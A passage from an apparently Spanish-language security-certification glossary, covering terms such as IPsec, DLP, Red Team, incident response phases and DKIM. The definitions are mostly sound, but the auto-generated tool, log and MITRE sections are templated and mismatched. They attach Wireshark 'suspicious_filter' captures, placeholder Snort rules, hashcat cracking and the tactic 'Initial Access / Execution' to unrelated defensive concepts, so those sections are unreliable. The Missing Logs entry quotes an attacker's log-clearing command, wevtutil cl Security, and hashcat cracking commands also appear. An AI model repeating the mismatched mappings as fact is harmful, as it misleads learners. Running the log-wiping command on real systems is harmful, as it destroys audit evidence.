- Picos en uso de recursos (CPU/RAM/Network)

#### 🎭 MITRE ATT&CK

**Ver MITRE ATT&CK matrix**  
- Tactic: Initial Access / Execution  
- Relevance: Relacionado con Least Privilege  
- Detection: Monitoreo de logs + behavioral analysis  

---

### Adaptive Identity (Identidad Adaptativa)

**Definición:** Control de acceso Zero Trust dinamico. Considera contexto: identidad, dispositivo, ubicacion, comportamiento. Decisiones de acceso en tiempo real

**Ejemplos:**
- MFA si login inusual
- Bloqueo desde pais no autorizado
- Require device compliance
- Azure Conditional Access

#### 🔧 Herramientas (Extension: auto-generated)

*No hay herramientas específicas documentadas.*

---

### IPsec (IP Security)

**Definición:** Suite de protocolos para seguridad IP. Cifrado, autenticacion e integridad. VPNs site-to-site. Layer 3 del modelo OSI

**Ejemplos:**
- VPN IPsec
- AH (Authentication Header)
- ESP (Encapsulating Security Payload)
- IKE (Internet Key Exchange)

#### 🔧 Herramientas (Extension: auto-generated)

**openssl:**  
- Propósito: Operaciones con IPsec (IP Security)  
- Comando: `openssl [subcommand]`  
- Output: Ver man openssl  

**hashcat:**  
- Propósito: Testing de fortaleza criptográfica  
- Comando: `hashcat -m [mode] hash.txt wordlist.txt`  
- Output: Crackeo de hashes  

#### 📊 Log Analysis

**Logs a revisar:**
- Windows: Event ID 4657 (registry value modification) para cambios en crypto settings
- Application logs: SSL/TLS handshake failures
- Syslog: openssl/crypto library errors

---

### PSK (Pre-Shared Key)

**Definición:** Clave secreta compartida previamente entre partes. Usado en WPA/WPA2-Personal. Autenticacion simetrica. Mas simple que 802.1X

**Ejemplos:**
- Contraseña WiFi casera
- WPA2-Personal
- WPA3-Personal SAE
- IPsec PSK authentication

#### 🔧 Herramientas (Extension: auto-generated)

**openssl:**  
- Propósito: Operaciones con PSK (Pre-Shared Key)  
- Comando: `openssl [subcommand]`  
- Output: Ver man openssl  

**hashcat:**  
- Propósito: Testing de fortaleza criptográfica  
- Comando: `hashcat -m [mode] hash.txt wordlist.txt`  
- Output: Crackeo de hashes  

#### 📊 Log Analysis

**Logs a revisar:**
- Windows: Event ID 4657 (registry value modification) para cambios en crypto settings
- Application logs: SSL/TLS handshake failures
- Syslog: openssl/crypto library errors

---

### GDPR (General Data Protection Regulation)

**Definición:** Reglamento UE de proteccion de datos personales. Derecho privacidad ciudadanos UE. Multas severas por incumplimiento. RGPD en español

**Ejemplos:**
- Right to be forgotten
- Data breach notification 72h
- Consent requirement
- Multas hasta 4% revenue

#### 🔧 Herramientas (Extension: auto-generated)

**Compliance scanner:**  
- Propósito: Verificar cumplimiento de GDPR (General Data Protection Regulation)  
- Comando: `nessus/openscap scan`  
- Output: Reporte de compliance  

**Audit logs:**  
- Propósito: Evidencia para auditorías  
- Comando: `Export logs para auditor`  
- Output: Logs estructurados  

#### 📊 Log Analysis

**Logs a revisar:**
- Audit logs: cambios en configuración de seguridad
- Access logs: quién accedió a datos sensibles
- Change management logs: tickets y aprobaciones

---

### Secure Baseline (Linea de Base Segura)

**Definición:** Configuracion estandar de seguridad minima. Template de hardening. Configuraciones y ajustes fundamentales. Punto de partida seguro

**Ejemplos:**
- CIS Benchmarks
- DISA STIGs
- Windows Security Baseline
- Disable unnecessary services
- Strong passwords

#### 🔧 Herramientas (Extension: auto-generated)

*No hay herramientas específicas documentadas.*

---

### Remote Wipe (Borrado Remoto)

**Definición:** Borrado remoto de datos en dispositivo movil perdido/robado. MDM feature. Protege datos corporativos. Factory reset remoto

**Ejemplos:**
- MDM remote wipe
- Find My iPhone erase
- Android Device Manager wipe
- Proteccion tras robo

#### 🔧 Herramientas (Extension: auto-generated)

*No hay herramientas específicas documentadas.*

---

### Data Retention Policy (Politica de Retencion de Datos)

**Definición:** Politica que especifica cuanto tiempo retener datos antes de eliminarlos. Requisitos legales y compliance. Ciclo de vida de datos

**Ejemplos:**
- Emails: 7 años
- Logs: 90 dias
- Backups: 30 dias
- Compliance GDPR, HIPAA
- Legal hold exceptions

#### 🔧 Herramientas (Extension: auto-generated)

*No hay herramientas específicas documentadas.*

---

### STARTTLS

**Definición:** Comando para upgradear conexion plaintext a TLS. Usado en SMTP, IMAP, POP3. Explicit TLS. Puerto estandar + upgrade

**Ejemplos:**
- SMTP puerto 587 + STARTTLS
- Upgrade conexion a TLS
- Mejor que SMTPS deprecated
- Fallback a plaintext posible

#### 🔧 Herramientas (Extension: auto-generated)

*No hay herramientas específicas documentadas.*

---

### SOW (Statement of Work)

**Definición:** Declaracion de trabajo detallada. Describe trabajo a realizar en proyecto. Alcance, entregables, timeline, costo

**Ejemplos:**
- SOW bajo MSA
- Define entregables especificos
- Proyecto pentest SOW
- Alcance y precio detallados

#### 🔧 Herramientas (Extension: auto-generated)

*No hay herramientas específicas documentadas.*

---

### CCMP (Counter Mode CBC-MAC Protocol)

**Definición:** Protocolo cifrado WPA2/WPA3. Basado en AES. Reemplazo de TKIP. Modo contador + autenticacion CBC-MAC

**Ejemplos:**
- WPA2 encryption
- AES-128 o AES-256
- Mas seguro que TKIP
- WPA3 usa CCMP

#### 🔧 Herramientas (Extension: auto-generated)

**openssl:**  
- Propósito: Operaciones con CCMP (Counter Mode CBC-MAC Protocol)  
- Comando: `openssl [subcommand]`  
- Output: Ver man openssl  

**hashcat:**  
- Propósito: Testing de fortaleza criptográfica  
- Comando: `hashcat -m [mode] hash.txt wordlist.txt`  
- Output: Crackeo de hashes  

#### 📊 Log Analysis

**Logs a revisar:**
- Windows: Event ID 4657 (registry value modification) para cambios en crypto settings
- Application logs: SSL/TLS handshake failures
- Syslog: openssl/crypto library errors

---

### CBC (Cipher Block Chaining)

**Definición:** Modo cifrado de bloques. Cada bloque XOR con anterior. IV para primer bloque. Popular pero vulnerable a padding oracle

**Ejemplos:**
- AES-CBC
- IV necesario
- Padding oracle vulnerability
- Encadenamiento de bloques
- Usado en TLS antiguo

#### 🔧 Herramientas (Extension: auto-generated)

**openssl:**  
- Propósito: Operaciones con CBC (Cipher Block Chaining)  
- Comando: `openssl [subcommand]`  
- Output: Ver man openssl  

**hashcat:**  
- Propósito: Testing de fortaleza criptográfica  
- Comando: `hashcat -m [mode] hash.txt wordlist.txt`  
- Output: Crackeo de hashes  

#### 📊 Log Analysis

**Logs a revisar:**
- Windows: Event ID 4657 (registry value modification) para cambios en crypto settings
- Application logs: SSL/TLS handshake failures
- Syslog: openssl/crypto library errors

---

### ECB (Electronic Codebook)

**Definición:** Modo cifrado de bloques MAS DEBIL. Cada bloque cifrado independiente. Patrones visibles. NO USAR

**Ejemplos:**
- AES-ECB (INSEGURO)
- Bloques identicos = cifrado identico
- Patrones visibles en imagenes
- NUNCA usar en produccion

#### 🔧 Herramientas (Extension: auto-generated)

**openssl:**  
- Propósito: Operaciones con ECB (Electronic Codebook)  
- Comando: `openssl [subcommand]`  
- Output: Ver man openssl  

**hashcat:**  
- Propósito: Testing de fortaleza criptográfica  
- Comando: `hashcat -m [mode] hash.txt wordlist.txt`  
- Output: Crackeo de hashes  

#### 📊 Log Analysis

**Logs a revisar:**
- Windows: Event ID 4657 (registry value modification) para cambios en crypto settings
- Application logs: SSL/TLS handshake failures
- Syslog: openssl/crypto library errors

---

### AUP (Acceptable Use Policy)

**Definición:** Politica de uso aceptable. Reglas de comportamiento para usuarios de sistemas IT. Que esta permitido/prohibido

**Ejemplos:**
- No uso personal excesivo
- Prohibido pirateria
- No acceso no autorizado
- Consecuencias violaciones
- Firma requerida

#### 🔧 Herramientas (Extension: auto-generated)

*No hay herramientas específicas documentadas.*

---

## Dominio 4 Operaciones Seguridad

**Peso examen:** 28%  **Términos ALTA prioridad:** 34  

### Static Code Analysis (Analisis de Codigo Estatico)

**Definición:** Analisis de codigo fuente sin ejecutarlo. Busca bugs, vulnerabilidades, code smells. SAST. Parte de DevSecOps

**Ejemplos:**
- SonarQube
- Checkmarx
- Fortify
- Encuentra SQL injection en codigo
- Pre-deployment testing

#### 🔧 Herramientas (Extension: auto-generated)

**Wireshark:**  
- Propósito: Detectar tráfico asociado a Static Code Analysis (Analisis de Codigo Estatico)  
- Comando: `wireshark -i eth0 -f 'suspicious_filter'`  
- Output: Capturas PCAP  

**Snort/Suricata:**  
- Propósito: IDS rules para detectar ataque  
- Comando: `alert tcp any any -> any any (msg:'Possible attack'; content:'|pattern|';)`  
- Output: Alertas IDS  

**IOC Patterns:**
- Patrones de tráfico asociados a Static Code Analysis (Analisis de Codigo Estatico)
- Anomalías en logs de aplicación/sistema
- Picos en uso de recursos (CPU/RAM/Network)

#### 🎭 MITRE ATT&CK

**Ver MITRE ATT&CK matrix**  
- Tactic: Initial Access / Execution  
- Relevance: Relacionado con Static Code Analysis (Analisis de Codigo Estatico)  
- Detection: Monitoreo de logs + behavioral analysis  

---

### Dynamic Code Analysis

**Definición:** Analisis de aplicacion en EJECUCION. Detecta vulnerabilidades en runtime. Parte de DAST

**Ejemplos:**
- Burp Suite
- OWASP ZAP
- Detecta: XSS, CSRF, autenticacion rota
- Fuzzing de inputs
- Testing en staging/QA

#### 🔧 Herramientas (Extension: auto-generated)

**Wireshark:**  
- Propósito: Detectar tráfico asociado a Dynamic Code Analysis  
- Comando: `wireshark -i eth0 -f 'suspicious_filter'`  
- Output: Capturas PCAP  

**Snort/Suricata:**  
- Propósito: IDS rules para detectar ataque  
- Comando: `alert tcp any any -> any any (msg:'Possible attack'; content:'|pattern|';)`  
- Output: Alertas IDS  

**IOC Patterns:**
- Patrones de tráfico asociados a Dynamic Code Analysis
- Anomalías en logs de aplicación/sistema
- Picos en uso de recursos (CPU/RAM/Network)

#### 🎭 MITRE ATT&CK

**Ver MITRE ATT&CK matrix**  
- Tactic: Initial Access / Execution  
- Relevance: Relacionado con Dynamic Code Analysis  
- Detection: Monitoreo de logs + behavioral analysis  

---

### Package Monitoring

**Definición:** Monitoreo de dependencias de software (bibliotecas, frameworks). Detecta vulnerabilidades conocidas en paquetes terceros

**Ejemplos:**
- OWASP Dependency-Check
- Snyk
- GitHub Dependabot
- Alertar sobre Log4j vulnerable
- npm audit / pip-audit

#### 🔧 Herramientas (Extension: auto-generated)

**Wireshark:**  
- Propósito: Detectar tráfico asociado a Package Monitoring  
- Comando: `wireshark -i eth0 -f 'suspicious_filter'`  
- Output: Capturas PCAP  

**Snort/Suricata:**  
- Propósito: IDS rules para detectar ataque  
- Comando: `alert tcp any any -> any any (msg:'Possible attack'; content:'|pattern|';)`  
- Output: Alertas IDS  

**IOC Patterns:**
- Patrones de tráfico asociados a Package Monitoring
- Anomalías en logs de aplicación/sistema
- Picos en uso de recursos (CPU/RAM/Network)

#### 🎭 MITRE ATT&CK

**Ver MITRE ATT&CK matrix**  
- Tactic: Initial Access / Execution  
- Relevance: Relacionado con Package Monitoring  
- Detection: Monitoreo de logs + behavioral analysis  

---

### DLP (Data Loss Prevention)

**Definición:** Tecnologia para prevenir fuga de datos sensibles. Monitorea, detecta, bloquea transferencias no autorizadas. Network-based, Endpoint-based, Cloud-based

**Ejemplos:**
- Bloquear envio de datos PII por email
- Prevenir copia a USB
- Detectar subida de datos a Dropbox
- Politicas basadas en contenido/contexto

#### 🔧 Herramientas (Extension: auto-generated)

**tcpdump:**  
- Propósito: Captura de tráfico relacionado con DLP (Data Loss Prevention)  
- Comando: `tcpdump -i any -w capture.pcap`  
- Output: Archivo PCAP  

**nmap:**  
- Propósito: Escaneo y detección  
- Comando: `nmap -sV -p- target`  
- Output: Puertos abiertos y servicios  

#### 📊 Log Analysis

**Logs a revisar:**
- Firewall logs: conexiones permitidas/denegadas
- Router/Switch logs: cambios en configuración
- NetFlow/sFlow data: análisis de tráfico

---

### Signatures (Security)

**Definición:** Patrones conocidos de malware/ataques. Usados por antivirus, IDS/IPS. Requiere actualizacion constante. Inefectivo contra zero-day

**Ejemplos:**
- Antivirus detecta hash de malware conocido
- IDS detecta patron de exploit
- Snort rules
- YARA rules

#### 🔧 Herramientas (Extension: auto-generated)

**Wireshark:**  
- Propósito: Detectar tráfico asociado a Signatures (Security)  
- Comando: `wireshark -i eth0 -f 'suspicious_filter'`  
- Output: Capturas PCAP  

**Snort/Suricata:**  
- Propósito: IDS rules para detectar ataque  
- Comando: `alert tcp any any -> any any (msg:'Possible attack'; content:'|pattern|';)`  
- Output: Alertas IDS  

**IOC Patterns:**
- Patrones de tráfico asociados a Signatures (Security)
- Anomalías en logs de aplicación/sistema
- Picos en uso de recursos (CPU/RAM/Network)

#### 🎭 MITRE ATT&CK

**Ver MITRE ATT&CK matrix**  
- Tactic: Initial Access / Execution  
- Relevance: Relacionado con Signatures (Security)  
- Detection: Monitoreo de logs + behavioral analysis  

---

### Orchestration (Orquestacion)

**Definición:** Coordinacion y gestion automatizada de multiples tareas y sistemas. Workflow automation complejo. Mas avanzado que automatizacion simple

**Ejemplos:**
- SOAR platform
- Kubernetes orchestration
- Incident response orchestration
- Coordina scripts + APIs + sistemas

#### 🔧 Herramientas (Extension: auto-generated)

*No hay herramientas específicas documentadas.*

---

### Automation (Security)

**Definición:** Automatizacion de tareas repetitivas de seguridad. Scripts, runbooks, respuestas automaticas. Reduce tiempo de respuesta

**Ejemplos:**
- Auto-bloqueo de IPs maliciosas
- Patch deployment automatico
- Respuesta automatica a incidentes
- Scripting con Python/PowerShell

#### 🔧 Herramientas (Extension: auto-generated)

**tcpdump:**  
- Propósito: Captura de tráfico relacionado con Automation (Security)  
- Comando: `tcpdump -i any -w capture.pcap`  
- Output: Archivo PCAP  

**nmap:**  
- Propósito: Escaneo y detección  
- Comando: `nmap -sV -p- target`  
- Output: Puertos abiertos y servicios  

#### 📊 Log Analysis

**Logs a revisar:**
- Firewall logs: conexiones permitidas/denegadas
- Router/Switch logs: cambios en configuración
- NetFlow/sFlow data: análisis de tráfico

---

### PCAP (Packet Capture)

**Definición:** Captura de paquetes de red para analisis. Formato de archivo .pcap. Wireshark, tcpdump. Analisis trafico y troubleshooting

**Ejemplos:**
- tcpdump -w capture.pcap
- Wireshark analysis
- Captura todo trafico red
- Analisis forense de red

#### 🔧 Herramientas (Extension: auto-generated)

**tcpdump:**  
- Propósito: Captura de tráfico relacionado con PCAP (Packet Capture)  
- Comando: `tcpdump -i any -w capture.pcap`  
- Output: Archivo PCAP  

**nmap:**  
- Propósito: Escaneo y detección  
- Comando: `nmap -sV -p- target`  
- Output: Puertos abiertos y servicios  

#### 📊 Log Analysis

**Logs a revisar:**
- Firewall logs: conexiones permitidas/denegadas
- Router/Switch logs: cambios en configuración
- NetFlow/sFlow data: análisis de tráfico

---

### Vulnerability Scanning

**Definición:** Escaneo automatizado de vulnerabilidades. Identifica debilidades de seguridad. Nessus, Qualys, OpenVAS

**Ejemplos:**
- Nessus scanner
- OpenVAS
- Qualys
- CVE detection
- Scheduled weekly scans
- False positives comunes

#### 🔧 Herramientas (Extension: auto-generated)

**Wireshark:**  
- Propósito: Detectar tráfico asociado a Vulnerability Scanning  
- Comando: `wireshark -i eth0 -f 'suspicious_filter'`  
- Output: Capturas PCAP  

**Snort/Suricata:**  
- Propósito: IDS rules para detectar ataque  
- Comando: `alert tcp any any -> any any (msg:'Possible attack'; content:'|pattern|';)`  
- Output: Alertas IDS  

**IOC Patterns:**
- Patrones de tráfico asociados a Vulnerability Scanning
- Anomalías en logs de aplicación/sistema
- Picos en uso de recursos (CPU/RAM/Network)

#### 🎭 MITRE ATT&CK

**Ver MITRE ATT&CK matrix**  
- Tactic: Initial Access / Execution  
- Relevance: Relacionado con Vulnerability Scanning  
- Detection: Monitoreo de logs + behavioral analysis  

---

### SASE (Secure Access Service Edge)

**Definición:** Framework cloud que combina funciones de red (SD-WAN) y seguridad (SWG, CASB, FWaaS, ZTNA) en servicio unico

**Ejemplos:**
- Convergencia de WAN y seguridad
- Seguridad basada en identidad
- Acceso seguro desde cualquier ubicacion
- Cloudflare SASE, Zscaler

#### 🔧 Herramientas (Extension: auto-generated)

**tcpdump:**  
- Propósito: Captura de tráfico relacionado con SASE (Secure Access Service Edge)  
- Comando: `tcpdump -i any -w capture.pcap`  
- Output: Archivo PCAP  

**nmap:**  
- Propósito: Escaneo y detección  
- Comando: `nmap -sV -p- target`  
- Output: Puertos abiertos y servicios  

#### 📊 Log Analysis

**Logs a revisar:**
- Firewall logs: conexiones permitidas/denegadas
- Router/Switch logs: cambios en configuración
- NetFlow/sFlow data: análisis de tráfico

---

### AUP (Acceptable Use Policy)

**Definición:** Politica que define uso aceptable de recursos IT de organizacion. Control directivo que guia comportamiento de usuarios

**Ejemplos:**
- No uso personal de email corporativo
- Prohibir descarga de software no autorizado
- Politicas de redes sociales

#### 🔧 Herramientas (Extension: auto-generated)

*No hay herramientas específicas documentadas.*

---

### Red Team

**Definición:** Equipo que simula atacantes reales. Pentest ofensivo y realista. Prueba controles de seguridad. Tacticas adversarias

**Ejemplos:**
- Simular APT
- Pentest sin conocimiento previo (black-box)
- Social engineering incluido
- Objetivos: comprometer red

#### 🔧 Herramientas (Extension: auto-generated)

*No hay herramientas específicas documentadas.*

---

### Blue Team

**Definición:** Equipo de defensa. Detecta y responde a ataques. Monitoriza logs y alertas. Defiende contra Red Team

**Ejemplos:**
- SOC analysts
- SIEM monitoring
- Incident response
- Threat hunting
- Detectar ataques Red Team

#### 🔧 Herramientas (Extension: auto-generated)

**Wireshark:**  
- Propósito: Detectar tráfico asociado a Blue Team  
- Comando: `wireshark -i eth0 -f 'suspicious_filter'`  
- Output: Capturas PCAP  

**Snort/Suricata:**  
- Propósito: IDS rules para detectar ataque  
- Comando: `alert tcp any any -> any any (msg:'Possible attack'; content:'|pattern|';)`  
- Output: Alertas IDS  

**IOC Patterns:**
- Patrones de tráfico asociados a Blue Team
- Anomalías en logs de aplicación/sistema
- Picos en uso de recursos (CPU/RAM/Network)

#### 🎭 MITRE ATT&CK

**Ver MITRE ATT&CK matrix**  
- Tactic: Initial Access / Execution  
- Relevance: Relacionado con Blue Team  
- Detection: Monitoreo de logs + behavioral analysis  

---

### Gray-Box Testing

**Definición:** Pentest con conocimiento parcial. Informacion limitada del sistema. Mezcla de black-box y white-box. Mas realista que white-box

**Ejemplos:**
- Credenciales de usuario normal
- Diagrama de red sin detalles
- Lista de IPs sin configuraciones
- Pentest semi-informado

#### 🔧 Herramientas (Extension: auto-generated)

*No hay herramientas específicas documentadas.*

---

### Active Reconnaissance

**Definición:** Reconocimiento activo. Interaccion directa con objetivo. Genera trafico detectable. Escaneos, sondeos

**Ejemplos:**
- Nmap port scan
- Vulnerability scan
- DNS zone transfer
- Banner grabbing
- MAS detectable que passive

#### 🔧 Herramientas (Extension: auto-generated)

*No hay herramientas específicas documentadas.*

---

### Passive Reconnaissance

**Definición:** Reconocimiento pasivo. Sin contacto directo con objetivo. Recopilacion de info publica. No genera alertas

**Ejemplos:**
- Google dorking
- WHOIS lookup
- Shodan
- DNS public records
- LinkedIn recon
- Archive.org
- NO detectable

#### 🔧 Herramientas (Extension: auto-generated)

*No hay herramientas específicas documentadas.*

---

### Fuzzing

**Definición:** Tecnica de testing automatizada. Envia inputs invalidos/aleatorios/inesperados. Busca crashes o comportamiento anormal. Encuentra vulnerabilidades

**Ejemplos:**
- AFL fuzzer
- Peach Fuzzer
- Burp Intruder
- Descubrir buffer overflows
- Input malformado
- Mutation-based fuzzing

#### 🔧 Herramientas (Extension: auto-generated)

**Wireshark:**  
- Propósito: Detectar tráfico asociado a Fuzzing  
- Comando: `wireshark -i eth0 -f 'suspicious_filter'`  
- Output: Capturas PCAP  

**Snort/Suricata:**  
- Propósito: IDS rules para detectar ataque  
- Comando: `alert tcp any any -> any any (msg:'Possible attack'; content:'|pattern|';)`  
- Output: Alertas IDS  

**IOC Patterns:**
- Patrones de tráfico asociados a Fuzzing
- Anomalías en logs de aplicación/sistema
- Picos en uso de recursos (CPU/RAM/Network)

#### 🎭 MITRE ATT&CK

**Ver MITRE ATT&CK matrix**  
- Tactic: Initial Access / Execution  
- Relevance: Relacionado con Fuzzing  
- Detection: Monitoreo de logs + behavioral analysis  

---

### Code Signing

**Definición:** Firma digital de codigo/software. Verifica autenticidad y integridad. Certificado del desarrollador. Previene modificacion maliciosa

**Ejemplos:**
- Certificado EV Code Signing
- Firma ejecutables .exe
- macOS Gatekeeper
- Windows SmartScreen
- Hash + firma privada

#### 🔧 Herramientas (Extension: auto-generated)

**Event Viewer:**  
- Propósito: Análisis de autenticación  
- Comando: `Get-WinEvent -FilterHashtable @{LogName='Security';ID=4624,4625}`  
- Output: Eventos de logon  

**grep:**  
- Propósito: Búsqueda en auth logs Linux  
- Comando: `grep 'Failed password' /var/log/auth.log`  
- Output: Intentos fallidos  

#### 📊 Log Analysis

**Logs a revisar:**
- Windows: Event ID 4624 (success), 4625 (failure), 4648 (explicit credentials)
- Linux: /var/log/auth.log, /var/log/secure
- RADIUS/TACACS+ logs

---

### Impossible Travel

**Definición:** Indicador de compromiso. Login desde ubicaciones geograficamente imposibles en tiempo corto. Usuario en Madrid y luego 1h despues en Tokio

**Ejemplos:**
- Login Paris 10am, luego Sydney 10:30am
- Azure AD Identity Protection
- Indicador robo de credenciales

#### 🔧 Herramientas (Extension: auto-generated)

**Event Viewer:**  
- Propósito: Análisis de autenticación  
- Comando: `Get-WinEvent -FilterHashtable @{LogName='Security';ID=4624,4625}`  
- Output: Eventos de logon  

**grep:**  
- Propósito: Búsqueda en auth logs Linux  
- Comando: `grep 'Failed password' /var/log/auth.log`  
- Output: Intentos fallidos  

#### 📊 Log Analysis

**Logs a revisar:**
- Windows: Event ID 4624 (success), 4625 (failure), 4648 (explicit credentials)
- Linux: /var/log/auth.log, /var/log/secure
- RADIUS/TACACS+ logs

---

### Missing Logs

**Definición:** Indicador de compromiso. Ausencia o borrado de logs. Atacantes eliminan evidencia. Gap en logs de auditoria

**Ejemplos:**
- Atacante ejecuta wevtutil cl Security
- Gap de 3 horas en logs
- Log tampering
- Indicador anti-forensics

#### 🔧 Herramientas (Extension: auto-generated)

*No hay herramientas específicas documentadas.*

---

### Incident Response - Preparation

**Definición:** Primera fase de IR. Preparacion previa a incidentes. Crear plan IR, entrenar equipo, herramientas listas. Proactividad

**Ejemplos:**
- Crear IR plan
- Training SOC team
- Deploy SIEM
- Contact list
- Tabletop exercises

#### 🔧 Herramientas (Extension: auto-generated)

*No hay herramientas específicas documentadas.*

---

### Incident Response - Detection and Analysis

**Definición:** Segunda fase de IR. Detectar e identificar incidentes. Analizar alcance, impacto y causa raiz. Determinar severidad

**Ejemplos:**
- SIEM alert
- Analizar logs
- Identificar IOC
- Determine scope
- Classify incident severity

#### 🔧 Herramientas (Extension: auto-generated)

*No hay herramientas específicas documentadas.*

---

### Incident Response - Containment, Eradication, Recovery

**Definición:** Tercera fase de IR. Contener amenaza, erradicar malware, recuperar sistemas. Limitar daño y restaurar operaciones

**Ejemplos:**
- Aislar sistema infectado
- Remove malware
- Restore from backup
- Patch vulnerabilities

#### 🔧 Herramientas (Extension: auto-generated)

**Wireshark:**  
- Propósito: Detectar tráfico asociado a Incident Response - Containment, Eradication, Recovery  
- Comando: `wireshark -i eth0 -f 'suspicious_filter'`  
- Output: Capturas PCAP  

**Snort/Suricata:**  
- Propósito: IDS rules para detectar ataque  
- Comando: `alert tcp any any -> any any (msg:'Possible attack'; content:'|pattern|';)`  
- Output: Alertas IDS  

**IOC Patterns:**
- Patrones de tráfico asociados a Incident Response - Containment, Eradication, Recovery
- Anomalías en logs de aplicación/sistema
- Picos en uso de recursos (CPU/RAM/Network)

#### 🎭 MITRE ATT&CK

**Ver MITRE ATT&CK matrix**  
- Tactic: Initial Access / Execution  
- Relevance: Relacionado con Incident Response - Containment, Eradication, Recovery  
- Detection: Monitoreo de logs + behavioral analysis  

---

### Incident Response - Post-Incident Activity

**Definición:** Cuarta fase de IR. Actividades tras incidente. Lessons learned, actualizar procedimientos, mejorar defensas. Documentacion

**Ejemplos:**
- Post-mortem meeting
- Update IR plan
- Document incident
- Improve detection rules
- Training updates

#### 🔧 Herramientas (Extension: auto-generated)

*No hay herramientas específicas documentadas.*

---

### SDLC (Software Development Life Cycle)

**Definición:** Proceso de creacion y mantenimiento de software. Fases: Planificacion, Analisis, Diseño, Implementacion, Testing, Deploy, Mantenimiento

**Ejemplos:**
- Waterfall SDLC
- Agile SDLC
- DevOps integration
- Secure SDLC
- Planning > Design > Code > Test > Deploy

#### 🔧 Herramientas (Extension: auto-generated)

*No hay herramientas específicas documentadas.*

---

### IoC (Indicator of Compromise)

**Definición:** Evidencia forense de actividad maliciosa. Artefactos que indican breach o compromiso. Hash malware, IP C2, dominios maliciosos

**Ejemplos:**
- Hash MD5 de malware
- IP de C2 server
- Dominio malicioso
- Registry key sospechosa
- Unusual outbound traffic

#### 🔧 Herramientas (Extension: auto-generated)

**openssl:**  
- Propósito: Operaciones con IoC (Indicator of Compromise)  
- Comando: `openssl [subcommand]`  
- Output: Ver man openssl  

**hashcat:**  
- Propósito: Testing de fortaleza criptográfica  
- Comando: `hashcat -m [mode] hash.txt wordlist.txt`  
- Output: Crackeo de hashes  

#### 📊 Log Analysis

**Logs a revisar:**
- Windows: Event ID 4657 (registry value modification) para cambios en crypto settings
- Application logs: SSL/TLS handshake failures
- Syslog: openssl/crypto library errors

---

### MDM (Mobile Device Management)

**Definición:** Gestion centralizada de dispositivos moviles. Control configuracion, seguridad, apps. Remote wipe. Enforce policies

**Ejemplos:**
- Intune
- MobileIron
- AirWatch
- Remote wipe
- App whitelist/blacklist
- Enforce encryption
- BYOD management

#### 🔧 Herramientas (Extension: auto-generated)

*No hay herramientas específicas documentadas.*

---

### CVE (Common Vulnerabilities and Exposures)

**Definición:** Sistema de identificacion de vulnerabilidades publicas. ID unico CVE-YEAR-NUMBER. MITRE mantiene base de datos. Referencia estandar

**Ejemplos:**
- CVE-2021-44228 (Log4Shell)
- CVE-2014-0160 (Heartbleed)
- CVE database MITRE
- Referencia estandar industria

#### 🔧 Herramientas (Extension: auto-generated)

**Wireshark:**  
- Propósito: Detectar tráfico asociado a CVE (Common Vulnerabilities and Exposures)  
- Comando: `wireshark -i eth0 -f 'suspicious_filter'`  
- Output: Capturas PCAP  

**Snort/Suricata:**  
- Propósito: IDS rules para detectar ataque  
- Comando: `alert tcp any any -> any any (msg:'Possible attack'; content:'|pattern|';)`  
- Output: Alertas IDS  

**IOC Patterns:**
- Patrones de tráfico asociados a CVE (Common Vulnerabilities and Exposures)
- Anomalías en logs de aplicación/sistema
- Picos en uso de recursos (CPU/RAM/Network)

#### 🎭 MITRE ATT&CK

**Ver MITRE ATT&CK matrix**  
- Tactic: Initial Access / Execution  
- Relevance: Relacionado con CVE (Common Vulnerabilities and Exposures)  
- Detection: Monitoreo de logs + behavioral analysis  

---

### DKIM (DomainKeys Identified Mail)

**Definición:** Autenticacion de email mediante firma digital. Verifica remitente y integridad mensaje. Clave privada firma, publica en DNS verifica

**Ejemplos:**
- DKIM-Signature header
- DNS TXT record con clave publica
- Previene email spoofing
- Parte de email authentication

#### 🔧 Herramientas (Extension: auto-generated)

**openssl:**  
- Propósito: Operaciones con DKIM (DomainKeys Identified Mail)  
- Comando: `openssl [subcommand]`  
- Output: Ver man openssl  

**hashcat:**  
- Propósito: Testing de fortaleza criptográfica  
- Comando: `hashcat -m [mode] hash.txt wordlist.txt`  
- Output: Crackeo de hashes  

#### 📊 Log Analysis

**Logs a revisar:**
- Windows: Event ID 4657 (registry value modification) para cambios en crypto settings
- Application logs: SSL/TLS handshake failures
- Syslog: openssl/crypto library errors

---

### DMARC (Domain-based Message Authentication, Reporting and Conformance)

**Definición:** Politica que especifica como manejar emails que fallan SPF/DKIM. Quarantine, Reject o None. Reportes de compliance

**Ejemplos:**
- DMARC DNS record
- p=reject (rechazar emails falsos)
- p=quarantine
- Reportes agregados RUA
- Combina SPF + DKIM

#### 🔧 Herramientas (Extension: auto-generated)

*No hay herramientas específicas documentadas.*

---

### OpenID Connect

**Definición:** Capa de autenticacion sobre OAuth 2.0. Verifica identidad usuario. ID Token (JWT). SSO moderno para web/mobile

**Ejemplos:**
- Sign in with Google
- Azure AD authentication
- ID Token JWT
- UserInfo endpoint
- OAuth 2.0 + Identity layer

#### 🔧 Herramientas (Extension: auto-generated)

**Event Viewer:**  
- Propósito: Análisis de autenticación  
- Comando: `Get-WinEvent -FilterHashtable @{LogName='Security';ID=4624,4625}`  
- Output: Eventos de logon  

**grep:**  
- Propósito: Búsqueda en auth logs Linux  
- Comando: `grep 'Failed password' /var/log/auth.log`  
- Output: Intentos fallidos  

#### 📊 Log Analysis

**Logs a revisar:**
- Windows: Event ID 4624 (success), 4625 (failure), 4648 (explicit credentials)
- Linux: /var/log/auth.log, /var/log/secure
- RADIUS/TACACS+ logs

---

### Biometrics (Biometria)

**Definición:** Autenticacion mediante caracteristicas biologicas o comportamentales. Huella, facial, iris, voz. Algo que eres

**Ejemplos:**
- Fingerprint scanner
- Face ID
- Iris scan
- Voice recognition
- Gait analysis
- FAR y FRR metrics

#### 🔧 Herramientas (Extension: auto-generated)

**Event Viewer:**  
- Propósito: Análisis de autenticación  
- Comando: `Get-WinEvent -FilterHashtable @{LogName='Security';ID=4624,4625}`  
- Output: Eventos de logon  

**grep:**  
- Propósito: Búsqueda en auth logs Linux  
- Comando: `grep 'Failed password' /var/log/auth.log`  
- Output: Intentos fallidos  

#### 📊 Log Analysis

**Logs a revisar:**
- Windows: Event ID 4624 (success), 4625 (failure), 4648 (explicit credentials)
- Linux: /var/log/auth.log, /var/log/secure
- RADIUS/TACACS+ logs

---

### Security Key (Llave de Seguridad)

**Definición:** Token hardware de autenticacion. USB/NFC. FIDO2/U2F. Phishing-resistant MFA. Dispositivo fisico para 2FA

**Ejemplos:**
- YubiKey
- Google Titan Key
- USB security key
- NFC tap
- WebAuthn
- Phishing-resistant

